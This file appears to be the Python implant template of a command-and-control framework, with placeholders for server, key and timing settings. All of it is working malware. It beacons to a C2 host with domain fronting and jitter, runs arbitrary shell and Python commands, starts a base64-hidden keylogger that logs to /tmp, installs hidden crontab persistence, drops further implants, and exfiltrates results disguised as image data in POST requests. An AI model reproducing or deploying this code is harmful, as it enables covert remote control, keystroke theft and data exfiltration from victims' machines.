import urllib2, os, subprocess, re, datetime, time, base64, string, random

def parse_sleep_time(sleep):
  if sleep.endswith('s'):
    return int(sleep.strip('s').strip())
  elif sleep.endswith('m'):
    return int(sleep.strip('m').strip()) * 60
  elif sleep.endswith('h'):
    return int(sleep.strip('h').strip()) * 60 * 60

hh = '%s'
timer = parse_sleep_time("%s".strip())
icoimage = [%s]
urls = [%s]
kd=time.strptime("%s","%%d/%%m/%%Y")
useragent = ""
imbase = "%s"
jitter = %s

def keylog():
  # keylogger imported from https://raw.githubusercontent.com/EmpireProject/Empire/fcd1a3d32b4c37a392c59ffe241b9cb973fde7f4/lib/modules/python/collection/osx/keylogger.py
  import os,time,base64,subprocess,uuid
  filename = "/tmp/%%s" %% uuid.uuid4().hex
  b64logger = "aW1wb3J0IG9zLHRpbWUKZmlsZW5hbWUgPSAiUkVQTEFDRU1FIgpvdXRwdXQgPSBvcy5wb3BlbignZWNobyAicmVxdWlyZSBcJ2Jhc2U2NFwnO2V2YWwoQmFzZTY0LmRlY29kZTY0KFwnWkdWbUlISjFZbmxmTVY4NVgyOXlYMmhwWjJobGNqOE5DaUFnVWxWQ1dWOVdSVkpUU1U5T0xuUnZYMllnUGowZ01TNDVJQ1ltSUZKVlFsbGZWa1ZTVTBsUFRpNTBiMTltUERJdU13MEtaVzVrRFFwa1pXWWdjblZpZVY4eVh6TmZiM0pmYUdsbmFHVnlQdzBLSUNCU1ZVSlpYMVpGVWxOSlQwNHVkRzlmWmlBK1BTQXlMak1OQ21WdVpBMEtjbVZ4ZFdseVpTQW5kR2h5WldGa0p3MEtjbVZ4ZFdseVpTQW5abWxrWkd4bEp5QnBaaUJ5ZFdKNVh6SmZNMTl2Y2w5b2FXZG9aWEkvRFFweVpYRjFhWEpsSUNkbWFXUmtiR1V2YVcxd2IzSjBKeUJwWmlCeWRXSjVYekpmTTE5dmNsOW9hV2RvWlhJL0RRcHlaWEYxYVhKbElDZGtiQ2NnYVdZZ2JtOTBJSEoxWW5sZk1sOHpYMjl5WDJocFoyaGxjajhOQ25KbGNYVnBjbVVnSjJSc0wybHRjRzl5ZENjZ2FXWWdibTkwSUhKMVlubGZNbDh6WDI5eVgyaHBaMmhsY2o4TkNrbHRjRzl5ZEdWeUlEMGdhV1lnWkdWbWFXNWxaRDhvUkV3Nk9rbHRjRzl5ZEdWeUtTQjBhR1Z1SUdWNGRHVnVaQ0JFVERvNlNXMXdiM0owWlhJZ1pXeHphV1lnWkdWbWFXNWxaRDhvUm1sa1pHeGxPanBKYlhCdmNuUmxjaWtnZEdobGJpQmxlSFJsYm1RZ1JtbGtaR3hsT2pwSmJYQnZjblJsY2lCbGJITmxJRVJNT2pwSmJYQnZjblJoWW14bElHVnVaQTBLWkdWbUlHMWhiR3h2WTNNb2MybDZaU2tOQ2lBZ2FXWWdjblZpZVY4eVh6TmZiM0pmYUdsbmFHVnlQdzBLSUNBZ0lFWnBaR1JzWlRvNlVHOXBiblJsY2k1dFlXeHNiMk1vYzJsNlpTa05DaUFnWld4emFXWWdjblZpZVY4eFh6bGZiM0pmYUdsbmFHVnlQeUFOQ2lBZ0lDQkVURG82UTFCMGNpNXRZV3hzYjJNb2MybDZaU2tOQ2lBZ1pXeHpaUTBLSUNBZ0lFUk1PanB0WVd4c2IyTW9jMmw2WlNrTkNpQWdaVzVrRFFwbGJtUU5DbWxtSUc1dmRDQnlkV0o1WHpGZk9WOXZjbDlvYVdkb1pYSS9EUW9nSUcxdlpIVnNaU0JFVEEwS0lDQWdJRzF2WkhWc1pTQkpiWEJ2Y25SaFlteGxEUW9nSUNBZ0lDQmtaV1lnYldWMGFHOWtYMjFwYzNOcGJtY29iV1YwYUN3Z0ttRnlaM01zSUNaaWJHOWpheWtOQ2lBZ0lDQWdJQ0FnYzNSeUlEMGdiV1YwYUM1MGIxOXpEUW9nSUNBZ0lDQWdJR3h2ZDJWeUlEMGdjM1J5V3pBc01WMHVaRzkzYm1OaGMyVWdLeUJ6ZEhKYk1TNHVMVEZkRFFvZ0lDQWdJQ0FnSUdsbUlITmxiR1l1Y21WemNHOXVaRjkwYno4Z2JHOTNaWElOQ2lBZ0lDQWdJQ0FnSUNCelpXeG1Mbk5sYm1RZ2JHOTNaWElzSUNwaGNtZHpEUW9nSUNBZ0lDQWdJR1ZzYzJVTkNpQWdJQ0FnSUNBZ0lDQnpkWEJsY2cwS0lDQWdJQ0FnSUNCbGJtUU5DaUFnSUNBZ0lHVnVaQTBLSUNBZ0lHVnVaQTBLSUNCbGJtUU5DbVZ1WkEwS1UwMWZTME5JVWw5RFFVTklSU0E5SURNNERRcFRUVjlEVlZKU1JVNVVYMU5EVWtsUVZDQTlJQzB5RFFwTlFWaGZRVkJRWDA1QlRVVWdQU0E0TUEwS2JXOWtkV3hsSUVOaGNtSnZiZzBLSUNCcFppQnlkV0o1WHpKZk0xOXZjbDlvYVdkb1pYSS9EUW9nSUNBZ1pYaDBaVzVrSUVacFpHUnNaVG82U1cxd2IzSjBaWElOQ2lBZ1pXeHpaUTBLSUNBZ0lHVjRkR1Z1WkNCRVREbzZTVzF3YjNKMFpYSU5DaUFnWlc1a0RRb2dJR1JzYkc5aFpDQW5MMU41YzNSbGJTOU1hV0p5WVhKNUwwWnlZVzFsZDI5eWEzTXZRMkZ5WW05dUxtWnlZVzFsZDI5eWF5OURZWEppYjI0bkRRb2dJR1Y0ZEdWeWJpQW5kVzV6YVdkdVpXUWdiRzl1WnlCRGIzQjVVSEp2WTJWemMwNWhiV1VvWTI5dWMzUWdVSEp2WTJWemMxTmxjbWxoYkU1MWJXSmxjaUFxTENCMmIybGtJQ29wSncwS0lDQmxlSFJsY200Z0ozWnZhV1FnUjJWMFJuSnZiblJRY205alpYTnpLRkJ5YjJObGMzTlRaWEpwWVd4T2RXMWlaWElnS2lrbkRRb2dJR1Y0ZEdWeWJpQW5kbTlwWkNCSFpYUkxaWGx6S0hadmFXUWdLaWtuRFFvZ0lHVjRkR1Z5YmlBbmRXNXphV2R1WldRZ1kyaGhjaUFxUjJWMFUyTnlhWEIwVm1GeWFXRmliR1VvYVc1MExDQnBiblFwSncwS0lDQmxlSFJsY200Z0ozVnVjMmxuYm1Wa0lHTm9ZWElnUzJWNVZISmhibk5zWVhSbEtIWnZhV1FnS2l3Z2FXNTBMQ0IyYjJsa0lDb3BKdzBLSUNCbGVIUmxjbTRnSjNWdWMybG5ibVZrSUdOb1lYSWdRMFpUZEhKcGJtZEhaWFJEVTNSeWFXNW5LSFp2YVdRZ0tpd2dkbTlwWkNBcUxDQnBiblFzSUdsdWRDa25EUW9nSUdWNGRHVnliaUFuYVc1MElFTkdVM1J5YVc1blIyVjBUR1Z1WjNSb0tIWnZhV1FnS2lrbkRRcGxibVFOQ25CemJpQTlJRzFoYkd4dlkzTW9NVFlwRFFwdVlXMWxJRDBnYldGc2JHOWpjeWd4TmlrTkNtNWhiV1ZmWTNOMGNpQTlJRzFoYkd4dlkzTW9UVUZZWDBGUVVGOU9RVTFGS1EwS2EyVjViV0Z3SUQwZ2JXRnNiRzlqY3lneE5pa05Dbk4wWVhSbElEMGdiV0ZzYkc5amN5ZzRLUTBLYVhSMlgzTjBZWEowSUQwZ1ZHbHRaUzV1YjNjdWRHOWZhUTBLY0hKbGRsOWtiM2R1SUQwZ1NHRnphQzV1Wlhjb1ptRnNjMlVwRFFwc1lYTjBWMmx1Wkc5M0lEMGdJaUlOQ25kb2FXeGxJQ2gwY25WbEtTQmtidzBLSUNCRFlYSmliMjR1UjJWMFJuSnZiblJRY205alpYTnpLSEJ6Ymk1eVpXWXBEUW9nSUVOaGNtSnZiaTVEYjNCNVVISnZZMlZ6YzA1aGJXVW9jSE51TG5KbFppd2dibUZ0WlM1eVpXWXBEUW9nSUVOaGNtSnZiaTVIWlhSTFpYbHpLR3RsZVcxaGNDa05DaUFnYzNSeVgyeGxiaUE5SUVOaGNtSnZiaTVEUmxOMGNtbHVaMGRsZEV4bGJtZDBhQ2h1WVcxbEtRMEtJQ0JqYjNCcFpXUWdQU0JEWVhKaWIyNHVRMFpUZEhKcGJtZEhaWFJEVTNSeWFXNW5LRzVoYldVc0lHNWhiV1ZmWTNOMGNpd2dUVUZZWDBGUVVGOU9RVTFGTENBd2VEQTRNREF3TVRBd0tTQStJREFOQ2lBZ1lYQndYMjVoYldVZ1BTQnBaaUJqYjNCcFpXUWdkR2hsYmlCdVlXMWxYMk56ZEhJdWRHOWZjeUJsYkhObElDZFZibXR1YjNkdUp5QmxibVFOQ2lBZ1lubDBaWE1nUFNCclpYbHRZWEF1ZEc5ZmMzUnlEUW9nSUdOaGNGOW1iR0ZuSUQwZ1ptRnNjMlVOQ2lBZ1lYTmphV2tnUFNBd0RRb2dJR04wY214amFHRnlJRDBnSWlJTkNpQWdLREF1TGk0eE1qZ3BMbVZoWTJnZ1pHOGdmR3Q4RFFvZ0lDQWdhV1lnS0NoaWVYUmxjMXRyUGo0elhTNXZjbVFnUGo0Z0tHc21OeWtwSUNZZ01TQStJREFwRFFvZ0lDQWdJQ0JwWmlCdWIzUWdjSEpsZGw5a2IzZHVXMnRkRFFvZ0lDQWdJQ0FnSUdOaGMyVWdhdzBLSUNBZ0lDQWdJQ0FnSUhkb1pXNGdNellOQ2lBZ0lDQWdJQ0FnSUNBZ0lHTjBjbXhqYUdGeUlEMGdJbHRsYm5SbGNsMGlEUW9nSUNBZ0lDQWdJQ0FnZDJobGJpQTBPQTBLSUNBZ0lDQWdJQ0FnSUNBZ1kzUnliR05vWVhJZ1BTQWlXM1JoWWwwaURRb2dJQ0FnSUNBZ0lDQWdkMmhsYmlBME9RMEtJQ0FnSUNBZ0lDQWdJQ0FnWTNSeWJHTm9ZWElnUFNBaUlDSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVXhEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJaR1ZzWlhSbFhTSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVXpEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJaWE5qWFNJTkNpQWdJQ0FnSUNBZ0lDQjNhR1Z1SURVMURRb2dJQ0FnSUNBZ0lDQWdJQ0JqZEhKc1kyaGhjaUE5SUNKYlkyMWtYU0lOQ2lBZ0lDQWdJQ0FnSUNCM2FHVnVJRFUyRFFvZ0lDQWdJQ0FnSUNBZ0lDQmpkSEpzWTJoaGNpQTlJQ0piYzJocFpuUmRJZzBLSUNBZ0lDQWdJQ0FnSUhkb1pXNGdOVGNOQ2lBZ0lDQWdJQ0FnSUNBZ0lHTjBjbXhqYUdGeUlEMGdJbHRqWVhCelhTSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVTREUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJiM0IwYVc5dVhTSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVTVEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJZM1J5YkYwaURRb2dJQ0FnSUNBZ0lDQWdkMmhsYmlBMk13MEtJQ0FnSUNBZ0lDQWdJQ0FnWTNSeWJHTm9ZWElnUFNBaVcyWnVYU0lOQ2lBZ0lDQWdJQ0FnSUNCbGJITmxEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSWlEUW9nSUNBZ0lDQWdJR1Z1WkEwS0lDQWdJQ0FnSUNCcFppQmpkSEpzWTJoaGNpQTlQU0FpSWlCaGJtUWdZWE5qYVdrZ1BUMGdNQTBLSUNBZ0lDQWdJQ0FnSUd0amFISWdQU0JEWVhKaWIyNHVSMlYwVTJOeWFYQjBWbUZ5YVdGaWJHVW9VMDFmUzBOSVVsOURRVU5JUlN3Z1UwMWZRMVZTVWtWT1ZGOVRRMUpKVUZRcERRb2dJQ0FnSUNBZ0lDQWdZM1Z5Y2w5aGMyTnBhU0E5SUVOaGNtSnZiaTVMWlhsVWNtRnVjMnhoZEdVb2EyTm9jaXdnYXl3Z2MzUmhkR1VwRFFvZ0lDQWdJQ0FnSUNBZ1kzVnljbDloYzJOcGFTQTlJR04xY25KZllYTmphV2tnUGo0Z01UWWdhV1lnWTNWeWNsOWhjMk5wYVNBOElERU5DaUFnSUNBZ0lDQWdJQ0J3Y21WMlgyUnZkMjViYTEwZ1BTQjBjblZsRFFvZ0lDQWdJQ0FnSUNBZ2FXWWdZM1Z5Y2w5aGMyTnBhU0E5UFNBd0RRb2dJQ0FnSUNBZ0lDQWdJQ0JqWVhCZlpteGhaeUE5SUhSeWRXVU5DaUFnSUNBZ0lDQWdJQ0JsYkhObERRb2dJQ0FnSUNBZ0lDQWdJQ0JoYzJOcGFTQTlJR04xY25KZllYTmphV2tOQ2lBZ0lDQWdJQ0FnSUNCbGJtUU5DaUFnSUNBZ0lDQWdaV3h6YVdZZ1kzUnliR05vWVhJZ0lUMGdJaUlOQ2lBZ0lDQWdJQ0FnSUNCd2NtVjJYMlJ2ZDI1YmExMGdQU0IwY25WbERRb2dJQ0FnSUNBZ0lHVnVaQTBLSUNBZ0lDQWdaVzVrRFFvZ0lDQWdaV3h6WlEwS0lDQWdJQ0FnY0hKbGRsOWtiM2R1VzJ0ZElEMGdabUZzYzJVTkNpQWdJQ0JsYm1RTkNpQWdaVzVrRFFvZ0lHbG1JR0Z6WTJscElDRTlJREFnYjNJZ1kzUnliR05vWVhJZ0lUMGdJaUlOQ2lBZ0lDQnBaaUJoY0hCZmJtRnRaU0FoUFNCc1lYTjBWMmx1Wkc5M0RRb2dJQ0FnSUNCd2RYUnpJQ0pjYmx4dVd5TjdZWEJ3WDI1aGJXVjlYU0F0SUZzamUxUnBiV1V1Ym05M2ZWMWNiaUlOQ2lBZ0lDQWdJR3hoYzNSWGFXNWtiM2NnUFNCaGNIQmZibUZ0WlEwS0lDQWdJR1Z1WkEwS0lDQWdJR2xtSUdOMGNteGphR0Z5SUNFOUlDSWlEUW9nSUNBZ0lDQndjbWx1ZENBaUkzdGpkSEpzWTJoaGNuMGlEUW9nSUNBZ1pXeHphV1lnWVhOamFXa2dQaUF6TWlCaGJtUWdZWE5qYVdrZ1BDQXhNamNOQ2lBZ0lDQWdJR01nUFNCcFppQmpZWEJmWm14aFp5QjBhR1Z1SUdGelkybHBMbU5vY2k1MWNHTmhjMlVnWld4elpTQmhjMk5wYVM1amFISWdaVzVrRFFvZ0lDQWdJQ0J3Y21sdWRDQWlJM3RqZlNJTkNpQWdJQ0JsYkhObERRb2dJQ0FnSUNCd2NtbHVkQ0FpV3lON1lYTmphV2w5WFNJTkNpQWdJQ0JsYm1RTkNpQWdJQ0FrYzNSa2IzVjBMbVpzZFhOb0RRb2dJR1Z1WkEwS0lDQkxaWEp1Wld3dWMyeGxaWEFvTUM0d01Ta05DbVZ1WkEwS0RRbz1cJykpIiB8IHJ1YnkgPiAlcyAyPiYxICYnICUgZmlsZW5hbWUpLnJlYWQoKQp0aW1lLnNsZWVwKDEpCg=="
  modb64logger = base64.b64decode(b64logger)
  modpayload = modb64logger.replace("REPLACEME",filename)
  exec(modpayload)
  pids = os.popen('ps aux | grep " ruby" | grep -v grep').read()
  returnval = "%%s \\r\\nKeylogger started here: %%s" %% (pids, filename)
  return returnval

def dfile(fname):
  if fname:
    with open(fname, "rb") as image_file:
      imgbytes = image_file.read()
  return "0000100001" + imgbytes

def ufile(base64file, fname):
  fname = fname.replace('"','')
  filebytes = base64.b64decode(base64file)
  try:
    output_file = open(fname, 'w')
    output_file.write(filebytes)
    output_file.close()
    return "Uploaded file %%s" %% fname
  except Exception as e:
    return "Error with source file: %%s" %% e

def sai(delfile=False):
  import uuid
  filename = "/tmp/%%s.sh" %% (uuid.uuid4().hex)
  imfull = base64.b64decode(imbase)
  output_file = open(filename, 'w')
  output_file.write(imfull)
  output_file.close()
  import subprocess
  returnval = "Ran Start Another Implant - File dropped: %%s" %% filename
  p = subprocess.Popen(["sh", filename])
  if delfile:
    p = subprocess.Popen(["rm", filename])
    returnval = "Ran Start Another Implant - File removed: %%s" %% filename
  return returnval

def persist():
  import uuid, os
  dircontent = "%%s/.%%s" %% (os.environ['HOME'], uuid.uuid4().hex)
  os.mkdir(dircontent)
  filename = "%%s/%%s_psh.sh" %% (dircontent, uuid.uuid4().hex)
  imfull = base64.b64decode(imbase)
  output_file = open(filename, 'w')
  output_file.write(imfull)
  output_file.close()
  import subprocess as s
  s.call("crontab -l | { cat; echo '* 10 * * * sh %%s'; } | crontab -" %% filename, shell=True)
  return "Installing persistence via user crontab everyday at 10am: \\r\\n%%s" %% filename

def remove_persist():
  import subprocess as s
  s.call("crontab -l | { cat;  } | grep -v '_psh.sh'| crontab -", shell=True)
  return "Removed user persistence via crontab: \\r\\n**must delete files manually**"

def decrypt_bytes_gzip(key, data):
  iv = data[0:16]
  aes = get_encryption(key, iv)
  data =  aes.decrypt(data)
  import StringIO
  import gzip
  infile = StringIO.StringIO(data[16:])
  with gzip.GzipFile(fileobj=infile, mode="r") as f:
    data = f.read()
  return data

while(True):
  cstr=time.strftime("%%d/%%m/%%Y",time.gmtime());cstr=time.strptime(cstr,"%%d/%%m/%%Y")
  if cstr < kd:
    key = "%s"
    uri = "%s"
    server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
    try:
      this_timer = random.randint(timer * (1 - jitter), timer * (1 + jitter))
      time.sleep(this_timer)
      ua='%s'
      if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
      else: req=urllib2.Request(server,headers={'User-agent':ua})
      res=urllib2.urlopen(req)
      html = res.read()
    except Exception as e:
      E = e
      #print "error %%s" %% e
    #print html
    if html:
      try:
        returncmd = decrypt(key, html)
        returncmd = returncmd.rstrip('\\0')
        returncmd = base64.b64decode(returncmd)

        if "multicmd" in returncmd:

          returncmd = returncmd.replace("multicmd","")
          returnval = ""
          splits = returncmd.split("!d-3dion@LD!-d")

          for split in splits:
            taskId = split[:5].strip().strip('\x00')
            cmd = split[5:].strip().strip('\x00')
            if cmd[:10] == "$sleeptime":
              sleep = cmd.replace("$sleeptime = ","").strip()
              timer = parse_sleep_time(sleep)
            elif cmd[:13] == "download-file":
              fname = cmd.replace("download-file ","")
              returnval = dfile(fname)
            elif cmd[:11] == "upload-file":
              fullparams = cmd.replace("upload-file ","")
              params = fullparams.split(":")
              returnval = ufile(params[1],params[0])
            elif cmd[:19] == "install-persistence":
              returnval = persist()
            elif cmd[:14] == "get-keystrokes":
              returnval = keylog()
            elif cmd[:18] == "remove-persistence":
              returnval = remove_persist()
            elif cmd[:19] == "startanotherimplant":
              returnval = sai(delfile=True)
            elif cmd[:28] == "startanotherimplant-keepfile":
              returnval = sai()
            elif cmd[:10] == "loadmodule":
              module = cmd.replace("loadmodule","")
              exec(module)
              try:
                import sys
                import StringIO
                import contextlib

                @contextlib.contextmanager
                def stdoutIO(stdout=None):
                  old = sys.stdout
                  if stdout is None:
                    stdout = StringIO.StringIO()
                  sys.stdout = stdout
                  yield stdout
                  sys.stdout = old

                with stdoutIO() as s:
                  exec module
                if s.getvalue():
                  returnval = s.getvalue()
                else:
                  returnval = "Module loaded"
              except Exception as e:
                returnval = "Error with source file: %%s" %% e

            elif cmd.startswith("linuxprivchecker"):
              args = cmd[len('linuxprivchecker'):].strip()
              args = args.split()
              pycode_index = args.index('-pycode')
              encoded_module = args[pycode_index +1]
              args.pop(pycode_index)
              args.pop(pycode_index)
              pycode = base64.b64decode(encoded_module)
              process = ['python', '-c', pycode]
              pycode = 'import sys; sys.argv = sys.argv[1:];' + pycode
              import subprocess
              returnval = subprocess.check_output(['python', '-c', pycode] + args)

            elif cmd[:6] == "python":
              module = cmd.replace("python ","")
              try:
                import sys
                import StringIO
                import contextlib

                @contextlib.contextmanager
                def stdoutIO(stdout=None):
                  old = sys.stdout
                  if stdout is None:
                    stdout = StringIO.StringIO()
                  sys.stdout = stdout
                  yield stdout
                  sys.stdout = old

                with stdoutIO() as s:
                  exec module

                returnval = s.getvalue()

              except Exception as e:
                returnval = "Error with source file: %%s" %% e

            else:
              try:
                returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
              except subprocess.CalledProcessError as exc:
                returnval = "ErrorCmd: %%s" %% exc.output

            server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
            opener = urllib2.build_opener()
            postcookie = encrypt(key, taskId)
            data = base64.b64decode(random.choice(icoimage))
            dataimage = data.ljust(1500, '\x00')
            dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
            if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
            res=urllib2.urlopen(req)
            response = res.read()

      except Exception as e:
        pass
